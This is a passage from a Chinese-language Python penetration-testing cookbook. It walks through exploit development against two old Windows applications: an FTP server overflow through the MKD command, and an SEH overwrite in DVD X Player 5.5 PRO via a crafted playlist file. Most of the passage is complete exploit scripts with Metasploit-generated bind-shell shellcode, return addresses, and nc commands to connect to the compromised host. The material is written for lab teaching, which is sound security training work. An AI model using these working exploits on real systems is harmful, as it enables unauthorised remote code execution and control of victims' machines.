s.recv(1024) 
s.send('PASS anonymous\r\n') 
s.recv(1024) 
s.send('MKD ' + evil + '\r\n') 
s.recv(1024) 
s.send('QUIT\r\n') 
s.close  
```

这将在 Windows 机器上创建大量数据并将其发送到 FTP 服务器。通过发送这个，程序将崩溃：

![](https://github.com/OpenDocCN/freelearn-sec-zh/raw/master/docs/py-pentest-cb/img/00085.jpeg)

在这里，您可以看到 EIP 寄存器被我们提供的缓冲区覆盖。此外，ESP 和 EDI 寄存器也包含我们的缓冲区。

1.  接下来，我们需要分析崩溃。为了做到这一点，我们需要用模式替换有效负载中的`A`。我们可以使用以下脚本生成模式：[`github.com/Svenito/exploit-pattern`](https://github.com/Svenito/exploit-pattern)。

下载脚本

1.  我们需要生成一个与我们之前提供的完全相同的有效负载模式。使用脚本下载，生成包含 1,000 个字符的模式。复制生成的模式：

![](https://github.com/OpenDocCN/freelearn-sec-zh/raw/master/docs/py-pentest-cb/img/00086.jpeg)

1.  使用模式作为有效负载更新 Python 脚本。因此，请在脚本中替换以下行：

```py
evil = "A"*1000 
```

使用以下代码：

```py
evil = "Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2Ai3Ai4Ai5Ai6Ai7Ai8Ai9Aj0Aj1Aj2Aj3Aj4Aj5Aj6Aj7Aj8Aj9Ak0Ak1Ak2Ak3Ak4Ak5Ak6Ak7Ak8Ak9Al0Al1Al2Al3Al4Al5Al6Al7Al8Al9Am0Am1Am2Am3Am4Am5Am6Am7Am8Am9An0An1An2An3An4An5An6An7An8An9Ao0Ao1Ao2Ao3Ao4Ao5Ao6Ao7Ao8Ao9Ap0Ap1Ap2Ap3Ap4Ap5Ap6Ap7Ap8Ap9Aq0Aq1Aq2Aq3Aq4Aq5Aq6Aq7Aq8Aq9Ar0Ar1Ar2Ar3Ar4Ar5Ar6Ar7Ar8Ar9As0As1As2As3As4As5As6As7As8As9At0At1At2At3At4At5At6At7At8At9Au0Au1Au2Au3Au4Au5Au6Au7Au8Au9Av0Av1Av2Av3Av4Av5Av6Av7Av8Av9Aw0Aw1Aw2Aw3Aw4Aw5Aw6Aw7Aw8Aw9Ax0Ax1Ax2Ax3Ax4Ax5Ax6Ax7Ax8Ax9Ay0Ay1Ay2Ay3Ay4Ay5Ay6Ay7Ay8Ay9Az0Az1Az2Az3Az4Az5Az6Az7Az8Az9Ba0Ba1Ba2Ba3Ba4Ba5Ba6Ba7Ba8Ba9Bb0Bb1Bb2Bb3Bb4Bb5Bb6Bb7Bb8Bb9Bc0Bc1Bc2Bc3Bc4Bc5Bc6Bc7Bc8Bc9Bd0Bd1Bd2Bd3Bd4Bd5Bd6Bd7Bd8Bd9Be0Be1Be2Be3Be4Be5Be6Be7Be8Be9Bf0Bf1Bf2Bf3Bf4Bf5Bf6Bf7Bf8Bf9Bg0Bg1Bg2Bg3Bg4Bg5Bg6Bg7Bg8Bg9Bh0Bh1Bh2B" 

```

1.  现在重新启动在测试机器中运行的 Immunity Debugger 中的应用程序：

![](https://github.com/OpenDocCN/freelearn-sec-zh/raw/master/docs/py-pentest-cb/img/00087.jpeg)

1.  然后再次运行 Python 脚本：

![](https://github.com/OpenDocCN/freelearn-sec-zh/raw/master/docs/py-pentest-cb/img/00088.gif)

这也会使应用程序崩溃，但 EIP 寄存器会更新为我们注入的模式的一部分

1.  现在我们可以使用`mona`来分析崩溃。在 Immunity Debugger 控制台中运行以下命令：

```py
!mona findmsp    
```

输出将如下所示：

![](https://github.com/OpenDocCN/freelearn-sec-zh/raw/master/docs/py-pentest-cb/img/00089.jpeg)

从中我们可以确定 EIP 寄存器被 247 后的 4 个字节覆盖了。

1.  现在我们可以更新模式，确切地覆盖 EIP 寄存器为我们想要的数据。

因此，我们可以尝试在前 247 个位置写入 A，然后在 EIP 寄存器中写入 4 个 B，并用 C 填充，因为我们需要 1000 个。然后用新的有效载荷更新 Python 脚本：

```py
evil = "A"*247 + "B"*4 + "C"*749      
```

在调试器中重新启动应用程序并再次运行 Python 脚本。这也会使应用程序崩溃。但是，检查寄存器：

![](https://github.com/OpenDocCN/freelearn-sec-zh/raw/master/docs/py-pentest-cb/img/00090.gif)

现在 EIP 被我们提供的值覆盖了。这里是`42424242`，也就是`BBBB`。

1.  现在我们必须用指针替换`BBBB`，以将执行流重定向到 ESP 寄存器。我们可以利用`mona`来找到这个指针：

```py
!mona jmp -r esp    
```

输出将如下所示：

![](https://github.com/OpenDocCN/freelearn-sec-zh/raw/master/docs/py-pentest-cb/img/00091.gif)

我们可以使用列表中的第一个指针，即`77def069`。

1.  现在用我们选择的指针来制作有效载荷。确保反转字节顺序以匹配 CPU 的小端架构。在`evil`中更新 Python 脚本的以下值：

```py
evil = "A"*247 + "\x69\xf0\xde\x77" + "C"*749  
```

现在在 Immunity Debugger 中重新启动应用程序，并在`77def069`处设置断点。您可以使用 Immunity Debugger 中的 Go to 选项转到该地址：

![](https://github.com/OpenDocCN/freelearn-sec-zh/raw/master/docs/py-pentest-cb/img/00092.jpeg)![](https://github.com/OpenDocCN/freelearn-sec-zh/raw/master/docs/py-pentest-cb/img/00093.jpeg)

设置断点如下：

![](https://github.com/OpenDocCN/freelearn-sec-zh/raw/master/docs/py-pentest-cb/img/00094.jpeg)

选择内存，选择访问选项。

然后运行 Python 脚本。这将在断点处使应用程序中断，我们可以查看寄存器如下：

![](https://github.com/OpenDocCN/freelearn-sec-zh/raw/master/docs/py-pentest-cb/img/00095.jpeg)

1.  现在我们可以从 Metasploit 生成 shell 代码并将其包含在有效载荷中：

```py
msfvenom -a x86 --platform Windows -p windows/shell/bind_tcp -e x86/shikata_ga_nai -b '\x00\x0A\x0D' -i 3 -f python 
```

![](https://github.com/OpenDocCN/freelearn-sec-zh/raw/master/docs/py-pentest-cb/img/00096.jpeg)

1.  用 shell 代码更新脚本。然后脚本将如下所示：

```py
#!/usr/bin/python   
import socket 
import sys  
buf =  "" 
buf += "\xbf\x9e\xc5\xad\x85\xdb\xd5\xd9\x74\x24\xf4\x5e\x2b" 
buf += "\xc9\xb1\x5b\x83\xee\xfc\x31\x7e\x11\x03\x7e\x11\xe2" 
buf += "\x6b\x7f\xe5\xd1\x52\x2f\x2c\x11\x8d\x44\xf5\x56\x73" 
buf += "\x94\x3c\x27\xde\xe7\xe8\x5a\x63\xc1\x11\x58\x7d\x94" 
buf += "\x3a\x04\xc4\x94\x24\x50\x67\x99\x3f\x8a\x42\x38\xa1" 
buf += "\x5d\x62\xd7\x19\x04\xbb\x10\x79\x3c\xf1\x22\x2d\x15" 
buf += "\x50\x23\x53\xe3\xb6\xe5\x7e\xc1\xe1\x89\x97\x85\xa2" 
buf += "\xbc\xbd\x3b\xb9\xbb\x71\x02\xde\x93\xe3\xc0\x22\x24" 
buf += "\xa5\x5d\x88\x4d\x31\xe6\xf9\xa2\xaf\x87\xd3\xc0\xaf" 
buf += "\xc3\xa5\x06\x8b\xb7\xac\xf0\x18\x10\x6b\xc4\xb4\x71" 
buf += "\xdf\x88\xd7\xda\xe0\x34\xa5\x88\xe0\x38\x6f\x6a\x06" 
buf += "\xbe\xe5\x63\xe3\xc8\x09\x91\xee\x9c\x75\x23\xe3\x7c" 
buf += "\xb5\xe9\xef\xc7\x12\x1e\x05\xa8\x26\x9e\xed\x7e\x86" 
buf += "\xce\x78\xec\x7e\x6e\x3b\x91\xa2\x8d\x1c\xc0\x08\x80" 
buf += "\xd2\x78\x88\xbd\xb7\xf5\x7e\x84\x51\x88\x5a\xa8\xbe" 
buf += "\x83\x9b\x46\x59\xbb\xb1\xe3\xd3\x52\xbe\x06\x2a\xbb" 
buf += "\xbc\x2a\x43\xb0\x6f\x91\x66\x73\x81\x58\x03\xc1\x03" 
buf += "\xa8\xf2\xe8\x3d\x9c\x69\x98\x59\xb4\x0c\x55\x85\x30" 
buf += "\x14\x49\x27\x9f\xfa\x79\x38\x6e\xfc\xf5\x49\x14\x83" 
buf += "\x64\x40\x5f\x52\xd7\xf1\x62\xec\xa6\xf0\x3d\xb9\xb7" 
buf += "\xd3\xa4\x17\xd0\xb2\x54\xb0\x82\x4b\xde\x2e\xd9\xda" 
buf += "\x34\xfb\xc3\xfa\xfc\xc9\xde\x24\x9f\x60\x03\xf5\xc0" 
buf += "\xcd\x33\x61\xd2\xe7\xd5\xce\xa3\xb1\xcc\x5d\x29\x94" 
buf += "\x20\xe5\x8f\xa8\x30\x0e\x0b\x78\x72\xd7\x88\x46\xa4" 
buf += "\x7e\x09\x5b\x8d\xff\xd8\x89\xb0\x86\xc4\x3d\x25\xf4" 
buf += "\x52\xdf\xa7\xde\x6b\x04\xce\x52\xa2\xa1\xb5\x7c\x2e" 
buf += "\x14\xee\xe1\x8d\xb9\x5d\xa5\x22\xd0\x5d\xd2\x61\xfa" 
buf += "\x3c\xae\xa3\x76\xca\x30\xcd\xe0\x74\xb8\x75\x7e\x0b" 
buf += "\x81\xf6\x03\x71\x07\x17\x6d\xf6\xa5\xf9\xdd\x42\xe8" 
buf += "\x6f\x82\x65\x6d\x92\xd5\x17\x85\x82\x48\x04\x53\xde"  
buffer = "\x90"*20 + buf 
evil = "A"*247 + "\x59\x54\xC3\x77" + buffer + "C"*(749-len(buffer))  
s=socket.socket(socket.AF_INET,socket.SOCK_STREAM) 
connect=s.connect(('192.168.1.37',21)) 
print (connect)  
s.recv(1024) 
s.send('USER anonymous\r\n') 
s.recv(1024) 
s.send('PASS anonymous\r\n') 
s.recv(1024) 
s.send('MKD ' + evil + '\r\n') 
s.recv(1024) 
s.send('QUIT\r\n') 
s.close 
```

1.  在调试器中重新启动应用程序并运行 Python 脚本。这将注入 shell 代码。现在我们可以尝试用`nc`连接受害机：

```py
nc -nv 192.168.1.37 4444  
```

![](https://github.com/OpenDocCN/freelearn-sec-zh/raw/master/docs/py-pentest-cb/img/00097.jpeg)

# 结构化异常处理

**结构化异常处理**（SEH）是一种防止缓冲区溢出的保护机制。SEH 使用链表，因为它包含一系列数据记录。当发生异常时，操作系统将遍历此列表并检查适当的异常函数。为此，异常处理程序需要指向当前异常注册记录（SEH）的指针和指向下一个异常注册记录（nSEH）的另一个指针。由于 Windows 堆栈向下增长，顺序将被颠倒：

![](https://github.com/OpenDocCN/freelearn-sec-zh/raw/master/docs/py-pentest-cb/img/00098.gif)

因此，如果我们可以用`POP POP RETN`指令覆盖 SEH，POP 将从堆栈顶部移除四个字节，RETN 将返回执行到堆栈顶部。由于 SEH 位于`esp+8`，我们可以用八个字节增加堆栈，并返回到堆栈顶部的新指针。然后我们将执行 nSEH。因此，我们可以添加一个四字节的操作码来跳转到另一个内存位置，我们可以在其中包含 shell。

# 准备工作

在这个教程中，我们将使用另一个易受攻击的应用程序：DVD X Player 5.5 PRO。您可以从以下网址下载：[`rejahrehim.com/assets/sample-package/dvd_player_sample.zip`](https://rejahrehim.com/assets/sample-package/dvd_player_sample.zip)。

与上一个教程一样，我们需要一台受害机器，安装有 Immunity Debugger 和`mona.py`的 Windows XP。还要在 Windows 机器上安装下载的应用程序 DVD X Player 5.5 PRO。

# 如何做...

以下是为 SEH 攻击创建利用脚本的步骤：

1.  在 Windows 机器上启动 Immunity Debugger 并将易受攻击的应用程序附加到其中：

![](https://github.com/OpenDocCN/freelearn-sec-zh/raw/master/docs/py-pentest-cb/img/00099.jpeg)![](https://github.com/OpenDocCN/freelearn-sec-zh/raw/master/docs/py-pentest-cb/img/00100.jpeg)

1.  创建一个名为`dvd_exploit.py`的 Python 文件来利用 DVD 播放器，并在编辑器中打开它。

1.  由于我们正在基于文件格式创建利用，我们将创建一个播放列表文件（.plf），其中包含一个很长的缓冲区，并允许 DVD 播放器读取它。由于缓冲区很长，DVD 播放器将因缓冲区溢出而崩溃。因此，受害者需要打开播放列表文件：

```py
#!/usr/bin/python 
filename="evil.plf"  
buffer = "A"*2000    
textfile = open(filename , 'w') 
textfile.write(buffer) 
textfile.close()  
```

1.  然后通过运行 Python 脚本创建播放列表文件并用播放器打开它：

```py
python dvd_exploit.py 
```

这将创建一个`evil.plf`文件

1.  在 DVD 播放器中打开它。然后播放器会崩溃。

检查崩溃的寄存器。还可以使用*Shift* + *F9*键通过崩溃：

![](https://github.com/OpenDocCN/freelearn-sec-zh/raw/master/docs/py-pentest-cb/img/00101.gif)

在寄存器中有许多零，因为 SEH 将它们清零。然后我们可以检查 SEH 链以验证我们是否已覆盖了 SEH：

![](https://github.com/OpenDocCN/freelearn-sec-zh/raw/master/docs/py-pentest-cb/img/00102.jpeg)

现在，我们可以生成一个模式并更新脚本以生成播放列表文件。我们已经下载了一个脚本来为之前的配方生成模式。我们可以使用相同的脚本：

```py
python exploit-pattern/pattern.py 2000    
```

1.  更新 Python 脚本中的`pattern`并生成有效载荷文件：

```py
#!/usr/bin/python  
filename="evil.plf"  
buffer = "Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2Ai3Ai4Ai5Ai6Ai7Ai8Ai9Aj0Aj1Aj2Aj3Aj4Aj5Aj6Aj7Aj8Aj9Ak0Ak1Ak2Ak3Ak4Ak5Ak6Ak7Ak8Ak9Al0Al1Al2Al3Al4Al5Al6Al7Al8Al9Am0Am1Am2Am3Am4Am5Am6Am7Am8Am9An0An1An2An3An4An5An6An7An8An9Ao0Ao1Ao2Ao3Ao4Ao5Ao6Ao7Ao8Ao9Ap0Ap1Ap2Ap3Ap4Ap5Ap6Ap7Ap8Ap9Aq0Aq1Aq2Aq3Aq4Aq5Aq6Aq7Aq8Aq9Ar0Ar1Ar2Ar3Ar4Ar5Ar6Ar7Ar8Ar9As0As1As2As3As4As5As6As7As8As9At0At1At2At3At4At5At6At7At8At9Au0Au1Au2Au3Au4Au5Au6Au7Au8Au9Av0Av1Av2Av3Av4Av5Av6Av7Av8Av9Aw0Aw1Aw2Aw3Aw4Aw5Aw6Aw7Aw8Aw9Ax0Ax1Ax2Ax3Ax4Ax5Ax6Ax7Ax8Ax9Ay0Ay1Ay2Ay3Ay4Ay5Ay6Ay7Ay8Ay9Az0Az1Az2Az3Az4Az5Az6Az7Az8Az9Ba0Ba1Ba2Ba3Ba4Ba5Ba6Ba7Ba8Ba9Bb0Bb1Bb2Bb3Bb4Bb5Bb6Bb7Bb8Bb9Bc0Bc1Bc2Bc3Bc4Bc5Bc6Bc7Bc8Bc9Bd0Bd1Bd2Bd3Bd4Bd5Bd6Bd7Bd8Bd9Be0Be1Be2Be3Be4Be5Be6Be7Be8Be9Bf0Bf1Bf2Bf3Bf4Bf5Bf6Bf7Bf8Bf9Bg0Bg1Bg2Bg3Bg4Bg5Bg6Bg7Bg8Bg9Bh0Bh1Bh2Bh3Bh4Bh5Bh6Bh7Bh8Bh9Bi0Bi1Bi2Bi3Bi4Bi5Bi6Bi7Bi8Bi9Bj0Bj1Bj2Bj3Bj4Bj5Bj6Bj7Bj8Bj9Bk0Bk1Bk2Bk3Bk4Bk5Bk6Bk7Bk8Bk9Bl0Bl1Bl2Bl3Bl4Bl5Bl6Bl7Bl8Bl9Bm0Bm1Bm2Bm3Bm4Bm5Bm6Bm7Bm8Bm9Bn0Bn1Bn2Bn3Bn4Bn5Bn6Bn7Bn8Bn9Bo0Bo1Bo2Bo3Bo4Bo5Bo6Bo7Bo8Bo9Bp0Bp1Bp2Bp3Bp4Bp5Bp6Bp7Bp8Bp9Bq0Bq1Bq2Bq3Bq4Bq5Bq6Bq7Bq8Bq9Br0Br1Br2Br3Br4Br5Br6Br7Br8Br9Bs0Bs1Bs2Bs3Bs4Bs5Bs6Bs7Bs8Bs9Bt0Bt1Bt2Bt3Bt4Bt5Bt6Bt7Bt8Bt9Bu0Bu1Bu2Bu3Bu4Bu5Bu6Bu7Bu8Bu9Bv0Bv1Bv2Bv3Bv4Bv5Bv6Bv7Bv8Bv9Bw0Bw1Bw2Bw3Bw4Bw5Bw6Bw7Bw8Bw9Bx0Bx1Bx2Bx3Bx4Bx5Bx6Bx7Bx8Bx9By0By1By2By3By4By5By6By7By8By9Bz0Bz1Bz2Bz3Bz4Bz5Bz6Bz7Bz8Bz9Ca0Ca1Ca2Ca3Ca4Ca5Ca6Ca7Ca8Ca9Cb0Cb1Cb2Cb3Cb4Cb5Cb6Cb7Cb8Cb9Cc0Cc1Cc2Cc3Cc4Cc5Cc6Cc7Cc8Cc9Cd0Cd1Cd2Cd3Cd4Cd5Cd6Cd7Cd8Cd9Ce0Ce1Ce2Ce3Ce4Ce5Ce6Ce7Ce8Ce9Cf0Cf1Cf2Cf3Cf4Cf5Cf6Cf7Cf8Cf9Cg0Cg1Cg2Cg3Cg4Cg5Cg6Cg7Cg8Cg9Ch0Ch1Ch2Ch3Ch4Ch5Ch6Ch7Ch8Ch9Ci0Ci1Ci2Ci3Ci4Ci5Ci6Ci7Ci8Ci9Cj0Cj1Cj2Cj3Cj4Cj5Cj6Cj7Cj8Cj9Ck0Ck1Ck2Ck3Ck4Ck5Ck6Ck7Ck8Ck9Cl0Cl1Cl2Cl3Cl4Cl5Cl6Cl7Cl8Cl9Cm0Cm1Cm2Cm3Cm4Cm5Cm6Cm7Cm8Cm9Cn0Cn1Cn2Cn3Cn4Cn5Cn6Cn7Cn8Cn9Co0Co1Co2Co3Co4Co5Co"  
textfile = open(filename , 'w') 
textfile.write(buffer) 
textfile.close() 
```

1.  在应用程序中打开生成的播放列表文件。它会崩溃。现在我们可以使用`mona.py`来分析崩溃并获取详细信息。为此，在 Immunity Debugger 控制台中运行以下命令：

```py
!mona findmsp 
```

![](https://github.com/OpenDocCN/freelearn-sec-zh/raw/master/docs/py-pentest-cb/img/00103.jpeg)

从中我们可以推断出 SEH 是 608 之后的 4 个字节。

1.  因此，我们可以制作我们的测试有效载荷，使其类似于`buffer = "A"*604 + [nSEH] + [SEH] + "D"*1384`。我们可以为 nSEH 添加`BBBB`，为 SEH 添加`CCCC`：

```py
buffer = "A"*604 + "B"*4 + "C"*4 + "D"*1388 
```

然后我们的脚本将如下所示：

```py
#!/usr/bin/python  
filename="evil.plf"     
buffer = "A"*604 + "B"*4 + "C"*4 + "D"*1388 
textfile = open(filename , 'w') 
textfile.write(buffer) 
textfile.close() 
```

1.  运行脚本并生成播放列表文件，然后用应用程序打开它。

1.  现在我们需要获得一个有效的指针，因为我们需要用指针覆盖 SEH。为了做到这一点，我们可以使用`mona.py`：

```py
!mona seh  
```

输出将如下所示：

![](https://github.com/OpenDocCN/freelearn-sec-zh/raw/master/docs/py-pentest-cb/img/00104.jpeg)

从中选择`s`指针。在这里我们可以选择以下一个：

```py
0x61617619 : pop esi # pop edi # ret  | asciiprint,ascii {PAGE_EXECUTE_READ} [EPG.dll] ASLR: False, Rebase: False, SafeSEH: False, OS: False, v1.12.21.2006 (C:\Program Files\Aviosoft\DVD X Player 5.5 Professional\EPG.dll)
```

1.  现在我们可以更新脚本中的`buffer`，将其写入 SEH：

```py
buffer = "A"*604 + "B"*4 + "\x19\x76\x61\x61" + "D"*1388  
```

1.  现在，我们的脚本将如下所示：

```py
#!/usr/bin/python  
filename="evil.plf" 
buffer = "A"*604 + "B"*4 + "\x19\x76\x61\x61" + "D"*1388 
textfile = open(filename , 'w') 
textfile.write(buffer) 
textfile.close() 
```

1.  运行脚本并生成播放列表文件并在 SEH 处设置断点。然后，将其加载到 DVD 播放器应用程序中。现在检查 SEH 内存位置。我们可以发现我们放在 SEH 中的指针被转换为操作码：

![](https://github.com/OpenDocCN/freelearn-sec-zh/raw/master/docs/py-pentest-cb/img/00105.gif)

1.  接下来，我们可以插入一个操作码，使 nSEH 向我们的填充区域进行短跳转。

1.  现在我们可以使用 Metasploit 生成 shell 代码，并更新脚本以包含 shell 代码。我们可以使用为之前的配方生成的相同 shell 代码。现在我们的利用代码将如下所示：

```py
#!/usr/bin/python    
filename="evil.plf"  
buf =  "" 
buf += "\xbf\x9e\xc5\xad\x85\xdb\xd5\xd9\x74\x24\xf4\x5e\x2b" 
buf += "\xc9\xb1\x5b\x83\xee\xfc\x31\x7e\x11\x03\x7e\x11\xe2" 
buf += "\x6b\x7f\xe5\xd1\x52\x2f\x2c\x11\x8d\x44\xf5\x56\x73" 
buf += "\x94\x3c\x27\xde\xe7\xe8\x5a\x63\xc1\x11\x58\x7d\x94" 
buf += "\x3a\x04\xc4\x94\x24\x50\x67\x99\x3f\x8a\x42\x38\xa1" 
buf += "\x5d\x62\xd7\x19\x04\xbb\x10\x79\x3c\xf1\x22\x2d\x15" 
buf += "\x50\x23\x53\xe3\xb6\xe5\x7e\xc1\xe1\x89\x97\x85\xa2" 
buf += "\xbc\xbd\x3b\xb9\xbb\x71\x02\xde\x93\xe3\xc0\x22\x24" 
buf += "\xa5\x5d\x88\x4d\x31\xe6\xf9\xa2\xaf\x87\xd3\xc0\xaf" 
buf += "\xc3\xa5\x06\x8b\xb7\xac\xf0\x18\x10\x6b\xc4\xb4\x71" 
buf += "\xdf\x88\xd7\xda\xe0\x34\xa5\x88\xe0\x38\x6f\x6a\x06" 
buf += "\xbe\xe5\x63\xe3\xc8\x09\x91\xee\x9c\x75\x23\xe3\x7c" 
buf += "\xb5\xe9\xef\xc7\x12\x1e\x05\xa8\x26\x9e\xed\x7e\x86" 
buf += "\xce\x78\xec\x7e\x6e\x3b\x91\xa2\x8d\x1c\xc0\x08\x80" 
buf += "\xd2\x78\x88\xbd\xb7\xf5\x7e\x84\x51\x88\x5a\xa8\xbe" 
buf += "\x83\x9b\x46\x59\xbb\xb1\xe3\xd3\x52\xbe\x06\x2a\xbb" 
buf += "\xbc\x2a\x43\xb0\x6f\x91\x66\x73\x81\x58\x03\xc1\x03" 
buf += "\xa8\xf2\xe8\x3d\x9c\x69\x98\x59\xb4\x0c\x55\x85\x30" 
buf += "\x14\x49\x27\x9f\xfa\x79\x38\x6e\xfc\xf5\x49\x14\x83" 
buf += "\x64\x40\x5f\x52\xd7\xf1\x62\xec\xa6\xf0\x3d\xb9\xb7" 
buf += "\xd3\xa4\x17\xd0\xb2\x54\xb0\x82\x4b\xde\x2e\xd9\xda" 
buf += "\x34\xfb\xc3\xfa\xfc\xc9\xde\x24\x9f\x60\x03\xf5\xc0" 
buf += "\xcd\x33\x61\xd2\xe7\xd5\xce\xa3\xb1\xcc\x5d\x29\x94" 
buf += "\x20\xe5\x8f\xa8\x30\x0e\x0b\x78\x72\xd7\x88\x46\xa4" 
buf += "\x7e\x09\x5b\x8d\xff\xd8\x89\xb0\x86\xc4\x3d\x25\xf4" 
buf += "\x52\xdf\xa7\xde\x6b\x04\xce\x52\xa2\xa1\xb5\x7c\x2e" 
buf += "\x14\xee\xe1\x8d\xb9\x5d\xa5\x22\xd0\x5d\xd2\x61\xfa" 
buf += "\x3c\xae\xa3\x76\xca\x30\xcd\xe0\x74\xb8\x75\x7e\x0b" 
buf += "\x81\xf6\x03\x71\x07\x17\x6d\xf6\xa5\xf9\xdd\x42\xe8" 
buf += "\x6f\x82\x65\x6d\x92\xd5\x17\x85\x82\x48\x04\x53\xde"  
#buffer = "Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2Ai3Ai4Ai5Ai6Ai7Ai8Ai9Aj0Aj1Aj2Aj3Aj4Aj5Aj6Aj7Aj8Aj9Ak0Ak1Ak2Ak3Ak4Ak5Ak6Ak7Ak8Ak9Al0Al1Al2Al3Al4Al5Al6Al7Al8Al9Am0Am1Am2Am3Am4Am5Am6Am7Am8Am9An0An1An2An3An4An5An6An7An8An9Ao0Ao1Ao2Ao3Ao4Ao5Ao6Ao7Ao8Ao9Ap0Ap1Ap2Ap3Ap4Ap5Ap6Ap7Ap8Ap9Aq0Aq1Aq2Aq3Aq4Aq5Aq6Aq7Aq8Aq9Ar0Ar1Ar2Ar3Ar4Ar5Ar6Ar7Ar8Ar9As0As1As2As3As4As5As6As7As8As9At0At1At2At3At4At5At6At7At8At9Au0Au1Au2Au3Au4Au5Au6Au7Au8Au9Av0Av1Av2Av3Av4Av5Av6Av7Av8Av9Aw0Aw1Aw2Aw3Aw4Aw5Aw6Aw7Aw8Aw9Ax0Ax1Ax2Ax3Ax4Ax5Ax6Ax7Ax8Ax9Ay0Ay1Ay2Ay3Ay4Ay5Ay6Ay7Ay8Ay9Az0Az1Az2Az3Az4Az5Az6Az7Az8Az9Ba0Ba1Ba2Ba3Ba4Ba5Ba6Ba7Ba8Ba9Bb0Bb1Bb2Bb3Bb4Bb5Bb6Bb7Bb8Bb9Bc0Bc1Bc2Bc3Bc4Bc5Bc6Bc7Bc8Bc9Bd0Bd1Bd2Bd3Bd4Bd5Bd6Bd7Bd8Bd9Be0Be1Be2Be3Be4Be5Be6Be7Be8Be9Bf0Bf1Bf2Bf3Bf4Bf5Bf6Bf7Bf8Bf9Bg0Bg1Bg2Bg3Bg4Bg5Bg6Bg7Bg8Bg9Bh0Bh1Bh2Bh3Bh4Bh5Bh6Bh7Bh8Bh9Bi0Bi1Bi2Bi3Bi4Bi5Bi6Bi7Bi8Bi9Bj0Bj1Bj2Bj3Bj4Bj5Bj6Bj7Bj8Bj9Bk0Bk1Bk2Bk3Bk4Bk5Bk6Bk7Bk8Bk9Bl0Bl1Bl2Bl3Bl4Bl5Bl6Bl7Bl8Bl9Bm0Bm1Bm2Bm3Bm4Bm5Bm6Bm7Bm8Bm9Bn0Bn1Bn2Bn3Bn4Bn5Bn6Bn7Bn8Bn9Bo0Bo1Bo2Bo3Bo4Bo5Bo6Bo7Bo8Bo9Bp0Bp1Bp2Bp3Bp4Bp5Bp6Bp7Bp8Bp9Bq0Bq1Bq2Bq3Bq4Bq5Bq6Bq7Bq8Bq9Br0Br1Br2Br3Br4Br5Br6Br7Br8Br9Bs0Bs1Bs2Bs3Bs4Bs5Bs6Bs7Bs8Bs9Bt0Bt1Bt2Bt3Bt4Bt5Bt6Bt7Bt8Bt9Bu0Bu1Bu2Bu3Bu4Bu5Bu6Bu7Bu8Bu9Bv0Bv1Bv2Bv3Bv4Bv5Bv6Bv7Bv8Bv9Bw0Bw1Bw2Bw3Bw4Bw5Bw6Bw7Bw8Bw9Bx0Bx1Bx2Bx3Bx4Bx5Bx6Bx7Bx8Bx9By0By1By2By3By4By5By6By7By8By9Bz0Bz1Bz2Bz3Bz4Bz5Bz6Bz7Bz8Bz9Ca0Ca1Ca2Ca3Ca4Ca5Ca6Ca7Ca8Ca9Cb0Cb1Cb2Cb3Cb4Cb5Cb6Cb7Cb8Cb9Cc0Cc1Cc2Cc3Cc4Cc5Cc6Cc7Cc8Cc9Cd0Cd1Cd2Cd3Cd4Cd5Cd6Cd7Cd8Cd9Ce0Ce1Ce2Ce3Ce4Ce5Ce6Ce7Ce8Ce9Cf0Cf1Cf2Cf3Cf4Cf5Cf6Cf7Cf8Cf9Cg0Cg1Cg2Cg3Cg4Cg5Cg6Cg7Cg8Cg9Ch0Ch1Ch2Ch3Ch4Ch5Ch6Ch7Ch8Ch9Ci0Ci1Ci2Ci3Ci4Ci5Ci6Ci7Ci8Ci9Cj0Cj1Cj2Cj3Cj4Cj5Cj6Cj7Cj8Cj9Ck0Ck1Ck2Ck3Ck4Ck5Ck6Ck7Ck8Ck9Cl0Cl1Cl2Cl3Cl4Cl5Cl6Cl7Cl8Cl9Cm0Cm1Cm2Cm3Cm4Cm5Cm6Cm7Cm8Cm9Cn0Cn1Cn2Cn3Cn4Cn5Cn6Cn7Cn8Cn9Co0Co1Co2Co3Co4Co5Co"  
evil = "\x90"*20 + buf  
buffer = "A"*608 + "\xEB\x06\x90\x90" + "\x19\x76\x61\x61" + evil + "B"*(1384-len(evil))  
textfile = open(filename , 'w') 
textfile.write(buffer) 
textfile.close() 
```

1.  现在使用脚本生成有效载荷文件。

1.  在调试器中运行应用程序并加载有效载荷。

1.  现在我们可以运行`nc`命令连接到系统：

```py
nc -nv 192.168.1.37 4444  
```

# Egg hunters

